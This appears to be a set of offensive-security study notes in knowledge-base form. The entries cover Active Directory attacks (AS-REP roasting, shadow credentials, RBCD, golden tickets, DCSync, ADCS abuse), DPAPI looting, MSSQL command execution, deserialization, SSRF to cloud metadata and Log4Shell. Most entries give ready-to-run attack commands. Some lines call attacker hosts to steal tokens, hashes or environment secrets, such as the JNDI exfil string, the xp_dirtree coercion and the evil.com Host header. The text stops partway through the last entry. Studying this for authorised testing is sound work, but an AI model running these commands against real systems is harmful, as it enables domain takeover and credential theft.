entries.title: AS-REP Roasting — crackable hashes without creds
entries.brief: Why accounts with 'no Kerberos preauth' leak an offline-crackable hash to anyone
entries.body:
## The precondition
Kerberos normally requires **pre-authentication**: to get a TGT you must first prove you know the
password (by encrypting a timestamp with your key). Some accounts have **"Do not require Kerberos
preauthentication"** set (`DONT_REQ_PREAUTH`). For those, the DC will hand out an **AS-REP** —
part of which is **encrypted with the user's password hash** — to **anyone who asks**, no creds
needed. That encrypted blob cracks offline.

## vs Kerberoasting
- **AS-REP roast** = targets accounts with preauth disabled; **needs no domain creds** (just a user
  list, or a valid account to enumerate). Hash type **$krb5asrep$ (hashcat -m 18200)**.
- **Kerberoast** = targets accounts with an SPN; **needs a valid domain account**. Hash type
  **$krb5tgs$ (-m 13100)**. (See: kerberoasting-deep.)

## Do it
    # No creds yet — spray a username list, keep the hits:
    impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC>
    # With any valid creds — find + roast every vulnerable account automatically:
    impacket-GetNPUsers domain.local/user:pass -request -dc-ip <DC> -outputfile asrep.txt
    # (Rubeus on Windows:  Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt)

## Crack
    hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

## Where the user list comes from
RID-cycling / enum (enum4linux-ng, nxc, rpcclient), kerbrute userenum, OSINT, or a leaked list.

## Pattern
"Find DONT_REQ_PREAUTH accounts -> request AS-REP -> crack -m 18200." It is the one roast you can
sometimes do **before** you have any password. (See: kerberos-ticket-formats, password-spraying,
bloodhound-queries.)

entries.title: Shadow Credentials — add a key, auth as the victim
entries.brief: How writing msDS-KeyCredentialLink lets you impersonate a user or computer without their password
entries.body:
## The idea
Modern AD supports certificate/key-based Kerberos auth (PKINIT) via the attribute
**msDS-KeyCredentialLink** on a user or computer object — it stores public keys trusted for that
account. If you have **write access** to that attribute (GenericWrite / GenericAll / AllExtendedRights
over the target), you can **add your own key pair**, then authenticate as the target with **your**
private key and pull its NT hash — no password reset, and it's quieter than a reset.

## Precondition (find it in BloodHound)
You control a principal with write over the target's object. BloodHound edge: `AddKeyCredentialLink`
(or GenericWrite/GenericAll). Needs the domain at a functional level with PKINIT available (a DC
with a cert / Key Trust).

## Do it (Certipy — Linux)
    certipy shadow auto -username you@domain.local -password 'Pass' -account victim$
    # -> adds a KeyCredential, authenticates via PKINIT, prints victim$'s NT hash + a .ccache
Then use that hash: pass-the-hash, or the TGT for onward Kerberos (pass-the-hash-ticket).
Whisker.exe is the Windows equivalent (`Whisker.exe add /target:victim$`).

## Cleanup
`certipy shadow` can restore the attribute; removing your added key avoids leaving a backdoor.

## vs RBCD / targeted Kerberoast
All three abuse write access over an object. Shadow Creds is often the cleanest: it yields the
target's **hash** directly and works against users and computers. (See: kerberos-delegation,
ad-acl-abuse, active-directory-adcs.)

## Pattern
"Write over the object -> add a KeyCredential -> PKINIT as the target -> get its hash." Any
`GenericWrite`/`GenericAll` edge in BloodHound is a shadow-creds candidate.

entries.title: MSSQL abuse — xp_cmdshell, impersonation, linked servers
entries.brief: Turning SQL Server access into command execution and lateral movement
entries.body:
## Get in
    impacket-mssqlclient domain/user:pass@<IP> -windows-auth   # Windows auth
    impacket-mssqlclient user:pass@<IP>                         # SQL auth
    # or GUI-ish: sqsh / nxc mssql <IP> -u user -p pass -x whoami
Default port **1433** (browser on UDP 1434). `nmap -p1433 --script ms-sql-info,ms-sql-empty-password`.

## 1. Command execution — xp_cmdshell
    EXEC xp_cmdshell 'whoami';                    -- if already enabled
    -- enable it (needs sysadmin):
    EXEC sp_configure 'show advanced options',1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
    EXEC xp_cmdshell 'powershell -enc <b64>';     -- then a reverse shell
Commands run as the **SQL Server service account** — often has SeImpersonate (-> potato to SYSTEM).

## 2. Become sysadmin — impersonation
    SELECT distinct b.name FROM sys.server_permissions a
      JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
      WHERE a.permission_name='IMPERSONATE';     -- who can we impersonate?
    EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
If you can impersonate `sa`, you are sysadmin -> enable xp_cmdshell.

## 3. Lateral movement — linked servers
    EXEC sp_linkedservers;  -- or: SELECT * FROM sys.servers;
    -- run on a linked server (may run as a higher-priv account there):
    EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED\SERVER];
Chains of linked servers often lead to another host where you are sysadmin.

## 4. Steal the service hash
    EXEC xp_dirtree '\\<ATTACKER>\share';  -- coerces SMB auth -> capture with responder (-> crack/relay)

## Pattern
"Auth -> can I impersonate sa? -> xp_cmdshell -> run as service acct -> potato to SYSTEM; or hop
via linked servers." MSSQL is both an RCE primitive and a pivot. (See: windows-potato-attacks,
coercion-ntlm-relay, database-enum.)

entries.title: Web cache poisoning — one request, every visitor
entries.brief: How unkeyed input stored in a shared cache serves your payload to everyone
entries.body:
## Cache keys vs unkeyed input
A cache decides "is this the same request?" using a **cache key** — usually method + host + path
(+ some query/headers). Anything **not** in the key is **unkeyed**: it can change the response but
the cache still treats two such requests as identical. If an **unkeyed input** is **reflected** into
the response, you can poison the cached copy, and every later visitor gets **your** version.

## The method
1. **Find an unkeyed input that reflects.** Try headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`,
   `X-Host`, `X-Forwarded-For`, `X-Original-URL`. Add a cache-buster to the URL so you only poison
   your own test copy first: `?cb=12345`.
2. **Confirm it reflects** (e.g. `X-Forwarded-Host: evil.com` appears in an absolute URL / script src).
3. **Confirm it's cached**: send twice; look for `X-Cache: hit`, `Age:`, `CF-Cache-Status: HIT`.
4. **Weaponise**: make the reflected value a payload (XSS via a poisoned script src, an open
   redirect, or a broken resource for DoS), then send **without** the cache-buster to poison the
   real key.

## Tooling
Burp + the **Param Miner** extension ("Guess headers") automates finding unkeyed inputs. Watch
response headers closely — `Vary:` tells you what *is* keyed.

## Cache deception (the cousin)
Trick the cache into storing a **private** page under a static-looking path, e.g. request
`/account/profile.css` — the app serves the profile, the cache stores it as a `.css`, and you read
another user's cached data. (See: open-redirect, xss-logic.)

## Pattern
"Find unkeyed input -> confirm reflect + cacheable -> poison the shared key." Impact scales to
every user of that cache, which is why it rates high. Always test with a cache-buster first so you
don't DoS the target during recon.

entries.title: RBCD — resource-based constrained delegation abuse
entries.brief: How write access over a computer object lets you forge a SYSTEM ticket to it
entries.body:
## What RBCD is
Normal constrained delegation is configured on the *front* service ("A may delegate to B"). **RBCD**
flips it: the **target** (resource) says "I trust service X to impersonate users to me," via the
attribute **msDS-AllowedToActOnBehalfOfOtherIdentity** on the target computer. So if you can
**write that attribute** on a computer, you can name a principal **you control** as trusted — then
use S4U to get a service ticket **as any user (e.g. Administrator) to that computer**.

## Precondition
- **Write** over the target computer object (GenericWrite / GenericAll / WriteProperty) — a
  BloodHound edge to the computer.
- **A controlled account with an SPN.** The default domain user quota lets you **create a machine
  account** (MachineAccountQuota, usually 10) to serve as that principal.

## Do it (Linux / Impacket + Certipy ecosystem)
    # 1. create a computer you control (uses the default quota):
    impacket-addcomputer corp.local/user:pass -computer-name EVIL$ -computer-pass 'Evil123' -dc-ip <DC>
    # 2. write RBCD on the target, trusting EVIL$:
    impacket-rbcd corp.local/user:pass -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write -dc-ip <DC>
    # 3. S4U: get a ticket as Administrator TO the target, as EVIL$:
    impacket-getST corp.local/EVIL$:'Evil123' -spn cifs/target.corp.local -impersonate Administrator -dc-ip <DC>
    export KRB5CCNAME=Administrator.ccache
    impacket-psexec -k -no-pass target.corp.local      # SYSTEM on the target

## vs Shadow Credentials
Both need write over the object. RBCD gives you **access to that one computer** as any user; shadow
creds give you the **victim's hash**. Pick by what the edge points at. (See: shadow-credentials-attack,
kerberos-delegation, ad-acl-abuse.)

## Pattern
"Write over a computer -> add a controlled account to its RBCD -> S4U impersonate Admin -> SYSTEM."

entries.title: DPAPI — decrypting Windows-protected secrets
entries.brief: Where Windows stores browser/Wi-Fi/Credential-Manager secrets and how to unlock them
entries.body:
## What DPAPI protects
The **Data Protection API** encrypts per-user secrets so apps don't store raw passwords: saved
browser logins, Wi-Fi keys, Credential Manager entries, RDP/VPN creds, and some app vaults. Each
is a **blob** encrypted with a key derived from a **masterkey**, which is itself protected by the
user's **password** (or, for domain users, a domain backup key the DC holds).

## Where it lives
    %APPDATA%\Microsoft\Protect\<SID>\<GUID>     # masterkeys
    %APPDATA%\Microsoft\Credentials\             # Credential Manager blobs
    %LOCALAPPDATA%\Microsoft\Credentials\
    browser "Login Data" / "Local State"           # Chrome/Edge saved logins

## Decrypt it
Once you have the user's password or NT hash (or SYSTEM + the DC backup key):
    # Linux, Impacket:
    impacket-dpapi masterkey -file <masterkey> -sid <SID> -password '<userpass>'
    impacket-dpapi credential -file <credblob> -key <decrypted-masterkey>
    # On host: mimikatz
    sekurlsa::dpapi            # masterkeys from LSASS memory
    dpapi::cred /in:<blob>
    # pypykatz can parse offline:  pypykatz dpapi ...
SharpDPAPI / SharpChrome automate browser + Credential Manager looting on-host.

## The domain angle
A **Domain Admin** can export the **DPAPI domain backup key** once, then decrypt **any** user's
DPAPI secrets across the domain forever (`mimikatz lsadump::backupkeys`). Powerful persistence.

## Pattern
"Find the blob -> get the masterkey (user pass / NT hash / domain backup key) -> decrypt." It is how
"I have the hash but want the actual cleartext app passwords" gets solved. (See: browser-and-vault-creds,
lsass-dumping, creds-hunting.)

entries.title: Targeted Kerberoast — give a victim an SPN, then roast it
entries.brief: Using write access to make any user roastable without touching their password
entries.body:
## The idea
Kerberoasting only works against accounts that **have an SPN**. If you have **write access** over a
user who has none (BloodHound: GenericWrite / GenericAll / WriteProperty on the user), you can
**temporarily add an SPN** to them, request a service ticket, crack it offline, then **remove the
SPN** to clean up. You never reset their password — you borrow their crackability.

## Do it (Linux)
    # targetedKerberoast automates add-SPN -> roast -> remove-SPN:
    targetedKerberoast.py -v -d corp.local -u youruser -p yourpass
    # -> prints $krb5tgs$ hashes for every user you can write to
    hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
Manual version: `bloodyAD ... set object victim servicePrincipalName -v 'fake/svc'`, then
`impacket-GetUserSPNs -request-user victim`, then remove the SPN.

## When to reach for it
You have some domain creds and a BloodHound path with a `GenericWrite`→user edge, but that user has
no SPN to roast and you'd rather not reset their password (noisy, locks them out). This is the quiet
alternative.

## Pattern
"Write over a user -> add SPN -> GetUserSPNs -> crack -m 13100 -> remove SPN." One of the three
classic write-abuse techniques alongside shadow creds and RBCD — pick by the edge's target.
(See: kerberoasting-deep, shadow-credentials-attack, ad-acl-abuse.)

entries.title: ADCS ESC1-ESC8 — abusing certificate templates
entries.brief: The common certificate-services misconfigurations that lead to domain compromise
entries.body:
## Why certs = a password that doesn't change
AD Certificate Services issues certificates that can be used for **PKINIT** Kerberos auth. A cert
for a user is effectively a long-lived credential — and it survives password resets. Misconfigured
templates let a low-priv user **request a cert as someone else** (often a Domain Admin).

## Find it first
    certipy find -u user@corp.local -p pass -dc-ip <DC> -vulnerable -stdout
This flags each template by **ESC** category. The high-value ones:

## The headline ESCs
- **ESC1** — template allows the **enrollee to supply the SAN** (subjectAltName) + client auth, and
  you can enroll. Request a cert "as Administrator":
      certipy req -u user@corp -p pass -ca <CA> -template <T> -upn administrator@corp -dc-ip <DC>
      certipy auth -pfx administrator.pfx -dc-ip <DC>      # -> TGT + NT hash
- **ESC2/ESC3** — overly broad EKU (Any Purpose / enrollment agent) — enroll on behalf of others.
- **ESC4** — you have **write** over a template -> reconfigure it into an ESC1 and fire.
- **ESC6** — the CA itself honours attacker SANs (EDITF_ATTRIBUTESUBJECTALTNAME2).
- **ESC8** — the CA runs a **web enrollment** endpoint over HTTP -> **NTLM relay** a coerced DC to
  it (`certipy relay`/ntlmrelayx) and get a DC cert -> DCSync.

## Use the cert
    certipy auth -pfx out.pfx -dc-ip <DC>     # PKINIT -> .ccache TGT + NT hash
    export KRB5CCNAME=... ; impacket-secretsdump -k -no-pass dc.corp.local

## Pattern
"certipy find -vulnerable -> match the ESC -> request a cert as a privileged user (or relay for
ESC8) -> auth -> hash/TGT." Certs are durable, so this is both privesc and persistence. (See:
coercion-ntlm-relay, shadow-credentials-attack, active-directory-adcs.)

entries.title: Password reset poisoning & token flaws
entries.brief: How broken reset flows let you take over accounts via the Host header or weak tokens
entries.body:
## Where account takeover hides in "forgot password"
The reset flow emails a link with a token. Two classes of bug:

## 1. Host-header poisoning
Many apps build the reset URL from the incoming **Host** (or `X-Forwarded-Host`) header:
`https://{Host}/reset?token=...`. If the app trusts it, send a reset for the **victim** but set:
    Host: evil.com
    (or)  X-Forwarded-Host: evil.com
The victim's email now contains `https://evil.com/reset?token=<their-valid-token>`. When they click
(or if a crawler/preview fetches it), the **valid token** lands on **your** server -> you reset their
password. Test with a cache-buster and confirm the link in the delivered mail.

## 2. Token weaknesses
- **Predictable/sequential** tokens, or ones derived from `time()`/`md5(email)` -> forge them.
- **No expiry / reusable** tokens.
- **Token not bound to the user** -> request your own token, then submit it with the victim's
  user id (an IDOR on the final step).
- **Token leaked** via Referer to third-party scripts, or reflected in the response.
- **Response-based**: the API returns the token/`success:true` to the browser instead of only emailing.

## Related
- **Email change** flows have the same issues (change victim's email, then reset).
- Overlaps with open-redirect (link host) and idor-access-control (token→user binding).

## Pattern
"Does the reset URL trust the Host header? Is the token predictable, reusable, or unbound to the
user?" Reset flows are a top real-world ATO source precisely because they're low-visibility.
(See: web-auth-bypass, idor-access-control, cookies-sessions-jwt.)

entries.title: WebSocket security testing
entries.brief: What changes when traffic moves to ws:// and where the bugs are
entries.body:
## Why WebSockets need their own look
After an HTTP `Upgrade` handshake, a WebSocket is a **long-lived, full-duplex** channel. Normal
request-based tooling and some WAF/authorization checks don't see per-message traffic, so bugs hide
here. The usual web bug classes still apply **inside** the messages — plus a couple of WS-specific ones.

## The handshake
    GET /chat HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: ...
    Origin: https://app.example.com        <- note this
Server replies `101 Switching Protocols`. Intercept this in Burp (it shows WS messages in a separate
history); use **Repeater**'s WebSocket mode to tamper individual frames.

## What to test
- **Cross-Site WebSocket Hijacking (CSWSH)** — if the handshake authenticates **only via cookies**
  and the server **doesn't validate `Origin`**, any site can open a WS as the logged-in victim and
  read/send messages. The WS equivalent of CSRF. Fix/finding: check Origin validation + a token.
- **Injection in messages** — SQLi, XSS (message rendered in another user's DOM), command injection
  — feed the same payloads into frames as you would into params.
- **Authorization per message** — a user may be allowed to connect but still send messages/actions
  they shouldn't (IDOR over a `room`/`userId` field in the frame).
- **No rate limiting / flooding** on the channel.

## Pattern
"Capture the handshake -> is Origin validated and is there a token? (CSWSH) -> then fuzz each message
type for the normal bug classes + per-message authz." (See: cors-misconfig, idor-access-control,
xss-logic.)

entries.title: SSH tunneling — -L, -R, -D decoded
entries.brief: The three SSH forwards, when to use each, and the exact pivot commands
entries.body:
## One tool, three directions
SSH can carry arbitrary TCP. The confusion is only which end listens and which end connects.

## -L  local forward (pull a remote service to you)
    ssh -L 8080:127.0.0.1:80 user@PIVOT
"On **my** machine, open :8080; anything there goes **through PIVOT** to 127.0.0.1:80 (as seen by
PIVOT)." Use to reach a service bound to localhost on the pivot, or an internal host **via** it:
    ssh -L 3306:10.10.20.5:3306 user@PIVOT     # reach internal DB at 10.10.20.5:3306 via mysql localhost:3306

## -R  remote forward (push a service to the target)
    ssh -R 9001:127.0.0.1:9001 user@PIVOT
"On **PIVOT**, open :9001; anything there comes **back to me** at 127.0.0.1:9001." Use when the
target can reach **you** only via the pivot — classic for catching a reverse shell from a deep host,
or exposing **your** listener to the internal net. (Needs `GatewayPorts yes` to bind non-local.)

## -D  dynamic (a SOCKS proxy = pivot into a whole subnet)
    ssh -D 1080 user@PIVOT
Opens a **SOCKS4/5** proxy on your :1080; point proxychains/Burp at it and reach **anything PIVOT
can reach**, no per-port forwards. The go-to for scanning an internal range:
    # /etc/proxychains4.conf -> socks5 127.0.0.1 1080
    proxychains nmap -sT -Pn 10.10.20.0/24

## Handy flags
`-f -N` (background, no shell), `-g` (let others use your local forward). No SSH client on the box?
use **chisel**, **ligolo-ng**, or **sshuttle** (see those).

## Pattern
"-L pull one port to me · -R push one port to them · -D SOCKS for the whole subnet." Decide by
*who can reach whom*. (See: port-forwarding, proxychains-pivoting, sshuttle-pivoting, pivoting-playbook.)

entries.title: sudo's own CVEs — Baron Samedit & friends
entries.brief: When the sudo binary itself is the vulnerability, not the sudoers policy
entries.body:
## Check the version first
    sudo --version        # or: sudo -V | head -1
`sudo -l` tells you policy; the **version** tells you whether the binary is exploitable regardless of
policy. A few high-impact bugs:

## CVE-2021-3156 — "Baron Samedit" (heap overflow)
Affects **sudo < 1.9.5p2** (and 1.8.x branches). A heap buffer overflow reachable by **any local
user**, even one **not in sudoers**. Public exploits give a root shell directly.
    # confirm vulnerable (no crash print = patched):
    sudoedit -s '\' $(python3 -c 'print("A"*1000)')    # "malformed" = patched; segfault = likely vuln
Then run a matching exploit (e.g. the blasty/worawit PoC) for a root shell.

## CVE-2019-14287 — `sudo -u#-1`
If sudoers lets a user run a command as **any user except root** (`(ALL, !root)`), you could pass a
UID of **-1 / 4294967295**, which sudo resolved to **0 (root)**:
    sudo -u#-1 /bin/bash
Patched in **1.8.28**.

## CVE-2019-18634 — pwfeedback stack overflow
Only when **`Defaults pwfeedback`** is set in sudoers (the asterisk-on-password option). Older sudo
< 1.8.31 is then overflowable from the password prompt.

## Where this fits
These live in the Linux privesc checklist as "check `sudo --version` early." They matter most when
`sudo -l` shows nothing useful — the binary may still be the way in. Match version → CVE → PoC.

## Pattern
"sudo --version -> map to a known CVE -> run the PoC." Always pair with the policy check (sudoers-file,
su-vs-sudo); either the rules or the binary can be the hole. (See: kernel-exploits, linux-enum-checklist.)

entries.title: OSCP exam strategy — time, points & proofs
entries.brief: How to spend 24 hours: scoring, order of attack, proof files, and not tunnel-visioning
entries.body:
## The scoreboard (know it cold)
The exam is **24h hacking + 24h reporting**, and you need a passing score (commonly **70/100**).
A typical layout: one **Active Directory set** (worth a large block, usually ~40, awarded as a chain)
plus standalone machines each worth **local + proof** (e.g. 10 for user + 10 for root/SYSTEM).
**Bonus points** may require submitting the lab/course exercises beforehand — bank those if offered.
Read *your* exam guide; the exact split is stated there.

## Order of attack
1. **Start the AD set first** if you're comfortable — it's the biggest single block and is
   all-or-stepwise. If AD scares you, grab a standalone's low-hanging fruit first for momentum.
2. **Enumerate everything before exploiting** — run autorecon/nmap on all targets up front so scans
   finish while you work.
3. **Get the easy points**: every `user.txt` first across boxes, then come back for root.

## The 15-minute rule (anti-rabbit-hole)
If a lead goes nowhere in ~15-20 min, **write it down and move on**. Rotate targets. Most failed
exams are one deep rabbit hole, not a lack of skill. Take real breaks — tired enumeration misses the
obvious port.

## Proof files (don't lose points you earned)
- `type C:\Users\<user>\Desktop\proof.txt` / `cat /root/proof.txt` — and in the **same screenshot**
  show `whoami` / `ipconfig` / `ip a` proving the host + user.
- **Screenshot immediately** when you get each shell; copy the proof hash into your notes with the IP.
- Note the **exact steps** as you go (commands + output) — you can't re-pwn at report time if you
  forgot how.

## Restrictions (read the rules)
Metasploit/meterpreter is usually limited to **one** target; **no** automated exploit tools
(sqlmap/autopwn) against exam hosts beyond allowed scope; no commercial tools. Revert a stuck box
from the panel. Know these before you start.

## Pattern
"Enumerate all -> bank easy points -> timebox every lead -> screenshot proofs as you go -> report
reproducibly." Discipline beats cleverness here. (See: note-taking-reporting, enumeration-automation,
scope-and-roe.)

entries.title: Java deserialization — ysoserial gadget chains
entries.brief: Why a serialized Java object reaching readObject() is remote code execution
entries.body:
## The bug in one line
If an app calls `ObjectInputStream.readObject()` on **attacker-controlled bytes**, reconstructing
the object can trigger a **chain of method calls** ("gadgets") already present in the app's
classpath that ends in command execution — no app code has to be "wrong," just the libraries.

## Spot the data
Serialized Java starts with magic bytes **`AC ED 00 05`**, or base64 **`rO0AB`**. Look for it in:
cookies, hidden fields, `ViewState`, RMI/JMX ports, T3 (WebLogic 7001), JMX/JNDI, any `Content-Type:
application/x-java-serialized-object`. Burp's **Java Deserialization Scanner** helps find sinks.

## Exploit — ysoserial
ysoserial builds a payload for a known gadget chain present in a library the target uses:
    java -jar ysoserial.jar CommonsCollections5 'ping -c1 <LHOST>' | base64 -w0
    # pick the chain by the library/version: CommonsCollections1-7, Spring1/2, URLDNS (detect only), etc.
Send the bytes where the app deserializes them. Use the **URLDNS** chain first (triggers a DNS
lookup to you) to *confirm* deserialization without needing RCE gadgets.

## Confirm then weaponise
1. **URLDNS** -> watch for a DNS hit (Burp Collaborator / your own DNS) = sink confirmed.
2. Enumerate the classpath / guess the framework -> pick the matching RCE chain.
3. Payload runs a reverse shell (base64/obfuscate it — see hacktools).

## Pattern
"Find serialized bytes (AC ED / rO0AB) reaching readObject -> URLDNS to confirm -> ysoserial RCE
chain matching the library." Same family as php/.NET deserialization. (See: deserialization-logic,
php-deserialization-phar, log4shell-jndi.)

entries.title: PHP object injection & phar:// deserialization
entries.brief: How unserialize() and phar wrappers turn file operations into object injection
entries.body:
## Classic PHP object injection
If user input reaches **`unserialize()`**, you can craft a serialized object of **any class the app
has loaded**, setting its properties to your values. When PHP destroys/uses it, "magic methods" fire:
- **`__wakeup()`** on unserialize, **`__destruct()`** at end of script, **`__toString()`** when used
  as a string. A class whose magic method does something dangerous (writes a file, runs a command,
  includes a path) is your **gadget** ("POP chain").
Serialized PHP looks like: `O:4:"User":1:{s:4:"name";s:5:"admin";}`.

## phar:// — deserialization without unserialize()
A **Phar** archive stores serialized **metadata**. When **any** filesystem function is given a
`phar://` path (`file_exists`, `fopen`, `getimagesize`, `file_get_contents`, `include`...), PHP
**deserializes that metadata automatically**. So even without a visible `unserialize()`, an upload +
a file op on a path you influence = object injection.
    # build a malicious phar whose metadata is your gadget object, save as image.jpg, then make the
    # app do a file op on phar://.../image.jpg
Tools: **phpggc** generates ready POP chains/phars for common frameworks (Laravel, Symfony, WordPress,
Monolog...):
    phpggc Monolog/RCE1 system 'id' -p phar -o evil.phar

## Where to look
Upload + later file access, `unserialize($_COOKIE/$_GET)`, template/cache files, anywhere a filename
is attacker-influenced near a filesystem call.

## Pattern
"unserialize() on input, OR a file op on a phar:// path -> craft an object of a loaded class whose
magic method is dangerous (use phpggc)." (See: deserialization-logic, file-upload-bypass,
java-deserialization.)

entries.title: SSRF to cloud metadata (169.254.169.254)
entries.brief: How an SSRF against the instance metadata service steals cloud credentials
entries.body:
## The target
Cloud VMs expose an **Instance Metadata Service (IMDS)** at the link-local address
**169.254.169.254**. It returns instance config — and, crucially, **temporary IAM/role credentials**.
If you have an **SSRF** (the app fetches a URL you control: webhooks, "import from URL", PDF/image
from URL, open redirects that get followed), point it at IMDS and read those creds.

## AWS (IMDSv1 — no header needed)
    http://169.254.169.254/latest/meta-data/iam/security-credentials/        # role name
    http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>  # AccessKey+Secret+Token
Export the three values and use the AWS CLI (`aws sts get-caller-identity`, then enumerate).

## IMDSv2 (session token required)
Newer instances require a PUT to get a token first — often **not possible via basic SSRF** (needs a
PUT + custom header), which is the mitigation. If the SSRF can send headers/PUT, you can still:
    PUT /latest/api/token  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
    GET /latest/meta-data/...  Header: X-aws-ec2-metadata-token: <token>

## Other clouds
- **GCP**: `http://metadata.google.internal/computeMetadata/v1/...` with header
  `Metadata-Flavor: Google` (token at `.../instance/service-accounts/default/token`).
- **Azure**: `http://169.254.169.254/metadata/instance?api-version=...` with header `Metadata: true`.

## SSRF filter bypasses
Decimal/hex IP (`http://2852039166/`), `http://[::ffff:169.254.169.254]`, redirects, DNS rebinding,
`@`-tricks. (See: ssrf-logic.)

## Pattern
"SSRF -> hit 169.254.169.254 (or the GCP/Azure equivalent) -> steal role creds -> pivot into the
cloud account." The jump from a web bug to full cloud access. (See: ssrf-logic, cloud-basics.)

entries.title: Log4Shell / JNDI injection (CVE-2021-44228)
entries.brief: Why a logged string like ${jndi:ldap://...} became instant RCE
entries.body:
## The mechanism
Vulnerable **Log4j 2** (< 2.15, fully fixed 2.17.x) performed **lookups** inside strings it logged.
The `${jndi:...}` lookup made the JVM do a **JNDI** fetch — and JNDI would load and instantiate a
**remote Java class** over LDAP/RMI. So if **any attacker-controlled value gets logged**, you inject:
    ${jndi:ldap://<ATTACKER>:1389/a}
and the server fetches+runs your class = RCE. The genius/horror: the input just has to be **logged**,
not "used."

## Where the value enters
Anything the app logs: **User-Agent**, `X-Forwarded-For`, `Referer`, username field, search box,
HTTP headers generally, chat messages. Spray the payload across headers and params.

## Confirm safely first
Use a canary/Collaborator host so a hit proves the bug without running code:
    ${jndi:ldap://<your-collab-id>.oast.fun/x}        # DNS/LDAP callback = vulnerable
Obfuscation that still worked (shows WAF bypass + the lookup nesting):
    ${${lower:j}ndi:${lower:l}dap://...}   ${${::-j}${::-n}${::-d}${::-i}:...}
Exfil variants: `${jndi:ldap://x/${env:AWS_SECRET_ACCESS_KEY}}`.

## Full RCE
Run a malicious LDAP referral + HTTP server (e.g. **marshalsec** or **JNDIExploit/rogue-jndi**) that
serves a class spawning your reverse shell; point the payload at it.

## Pattern
"Put ${jndi:ldap://you/x} into every loggable field -> callback confirms -> serve a malicious class
for RCE." The archetypal 'input only had to be logged' vuln. (See: java-deserialization,
command-injection-logic, data-exfiltration.)

entries.title: Golden & silver tickets — forging Kerberos
entries.brief: What the krbtgt hash and a service hash let you forge, and how they differ
entries.body:
## The two forgeries
Kerberos tickets are encrypted with a key = an account's password hash. Steal the right hash and you
**forge your own tickets** offline — no DC validation of the contents.

## Golden ticket (forge a TGT with the krbtgt hash)
The **krbtgt** account's hash signs **every** TGT in the domain. With it you can mint a TGT for
**any user (incl. a fake Domain Admin) with any group membership**, valid until krbtgt is rotated
**twice**. It is **domain-wide, full, durable** access — the ultimate persistence.
    # get krbtgt hash first (DCSync / secretsdump as DA):
    impacket-secretsdump corp.local/DA:pass@dc -just-dc-user krbtgt
    # forge:
    impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain corp.local Administrator
    export KRB5CCNAME=Administrator.ccache ; impacket-psexec -k -no-pass dc.corp.local
(mimikatz: `kerberos::golden /user:Administrator /krbtgt:<hash> /sid:<SID> /domain:... /ptt`)

## Silver ticket (forge a service ticket with a service's hash)
Using a **service account's** (or a computer account's) hash, forge a **TGS** straight to **that one
service** (e.g. CIFS/HOST/MSSQL on one host). **Narrower** (one service, one host) but **stealthier**
— the DC is never contacted at all, so no TGT request is logged.
    impacket-ticketer -nthash <service-or-machine-hash> -domain-sid <SID> -domain corp.local \
      -spn cifs/host.corp.local Administrator

## Golden vs silver
- Golden = **krbtgt** hash -> any service, whole domain, DC-logged TGT, huge blast radius.
- Silver = **service/machine** hash -> one service on one host, no DC contact, quieter.

## Pattern
"Have krbtgt? forge a golden TGT = domain god. Have only a service/machine hash? forge a silver TGS
to that service." Both need the SID (`whoami /user`, or lookupsid). (See: dcsync-dcshadow,
pass-the-hash-ticket, kerberos-ticket-formats.)

entries.title: DCSync & DCShadow — stealing and planting at the DC
entries.brief: How replication rights let you pull every hash, or write changes as a rogue DC
entries.body:
## DCSync — pull secrets via replication
Domain controllers sync by **replication**. Any principal granted the rights **DS-Replication-Get-
Changes** (+ **-All**) can **ask a DC to replicate account secrets** — i.e. dump **any user's NT
hash, including krbtgt**, **without touching the DC's disk or running code on it**. Domain Admins and
default admins have these rights; so do some delegated accounts (a classic BloodHound finding:
`GetChanges`/`GetChangesAll` edges, or `DCSync`).
    impacket-secretsdump -just-dc corp.local/DA:pass@dc        # everything
    impacket-secretsdump -just-dc-user krbtgt corp.local/DA:pass@dc   # just krbtgt -> golden ticket
    # nxc:  nxc smb dc -u DA -p pass --ntds
With krbtgt's hash you pivot to a golden ticket (golden-silver-tickets).

## When to use it
The moment you have DA-equivalent or a `GetChangesAll` ACL. It's the standard "dump the domain" step
and the input to Pass-the-Hash / ticket forging.

## DCShadow — write as a rogue DC (advanced persistence)
DCShadow **registers a fake DC** and uses replication to **push attribute changes** into AD
(e.g. add SIDHistory, set a primaryGroupID, plant msDS-AllowedToActOnBehalfOf). Because it comes
"from a DC via replication," it often **bypasses normal change logging**. Requires high privilege to
set up; it's a stealthy-persistence/manipulation technique more than a first win.

## Pattern
"Replication rights -> DCSync dumps every hash (grab krbtgt) -> golden ticket / PtH. DCShadow writes
back as a fake DC for quiet persistence." Audit `GetChangesAll` on non-DA principals. (See:
coercion-ntlm-relay, adcs-esc-attacks, ad-persistence.)

entries.title: Unquoted service paths — the space-in-path privesc
entries.brief: How a Windows service with an unquoted path + a writable folder gives SYSTEM
entries.body:
## Why spaces + no quotes = trouble
A Windows service runs a binary path stored in the registry. If that path has **spaces** and is
**not quoted**, the Service Control Manager tries each space-split prefix **with `.exe` appended**,
left to right. For:
    C:\Program Files\Some App\service.exe        (no quotes)
Windows tries, in order:
    C:\Program.exe
    C:\Program Files\Some.exe
    C:\Program Files\Some App\service.exe
If you can **write** to `C:\` or `C:\Program Files\Some App\` and drop `Program.exe` or
`Some.exe`, the service runs **your** binary — usually as **SYSTEM** on start.

## Find it
    wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\"
    # keep the lines whose PathName has a space but no surrounding quotes.
    # PowerShell equivalent:
    Get-WmiObject win32_service | ? { $_.PathName -match ' ' -and $_.PathName -notmatch '^\"' } |
      select Name, PathName, StartMode
Then check write access on the candidate folders: `icacls "C:\Program Files\Some App"` (look for
